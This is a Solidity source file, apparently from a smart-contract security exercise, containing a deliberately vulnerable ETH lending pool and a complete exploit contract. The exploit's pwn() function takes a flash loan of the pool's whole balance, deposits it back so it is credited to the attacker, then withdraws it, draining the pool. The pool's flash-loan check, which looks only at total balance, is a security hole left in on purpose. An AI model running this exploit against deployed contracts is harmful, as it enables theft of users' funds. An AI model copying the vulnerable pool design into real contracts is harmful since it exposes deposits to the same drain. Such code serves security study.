// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract EthLendingPool {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 _amount) external {
        balances[msg.sender] -= _amount;
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "send ETH failed");
    }

    function flashLoan(
        uint256 _amount,
        address _target,
        bytes calldata _data
    ) external {
        uint256 balBefore = address(this).balance;
        require(balBefore >= _amount, "borrow amount > balance");

        (bool executed, ) = _target.call{value: _amount}(_data);
        require(executed, "loan failed");

        uint256 balAfter = address(this).balance;
        require(balAfter >= balBefore, "balance after < before");
    }
}

interface IEthLendingPool {
    function balances(address) external view returns (uint256);

    function deposit() external payable;

    function withdraw(uint256 _amount) external;

    function flashLoan(
        uint256 amount,
        address target,
        bytes calldata data
    ) external;
}

contract EthLendingPoolExploit {
    IEthLendingPool public pool;

    constructor(address _pool) {
        pool = IEthLendingPool(_pool);
    }

    //4. receive ETH from withdraw
    receive() external payable {}

    // 2. deposit loan into pool
    function deposit() external payable {
        pool.deposit{value: msg.value}();
    }

    function pwn() external {
        uint256 bal = address(pool).balance;
        // 1. call flash loan
        pool.flashLoan(
            bal,
            address(this),
            abi.encodeWithSignature("deposit()")
        );
        // 3. withdraw
        pool.withdraw(pool.balances(address(this)));
    }
}
